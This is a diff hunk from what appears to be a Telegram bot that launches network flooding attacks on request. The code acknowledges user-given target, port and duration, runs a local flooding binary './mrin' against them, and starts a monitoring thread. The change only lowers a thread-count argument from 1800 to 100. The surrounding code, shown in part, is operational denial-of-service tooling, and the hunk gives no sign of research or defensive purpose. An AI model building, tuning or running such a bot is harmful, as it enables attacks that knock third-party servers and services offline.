@@ -321,7 +321,7 @@ def create_handlers(bot):
 
             response = f"Flooding parameters set: {target}:{port} for {duration}. Attack Running."
             bot.reply_to(message, response)
-            full_command = ["./mrin", target, str(port), str(duration), "1800"]
+            full_command = ["./mrin", target, str(port), str(duration), "100"]
             process = subprocess.Popen(full_command, shell=False)
             threading.Thread(target=monitor_attack, args=(process, bot, chat_id, target, port, duration), daemon=True).start()
 
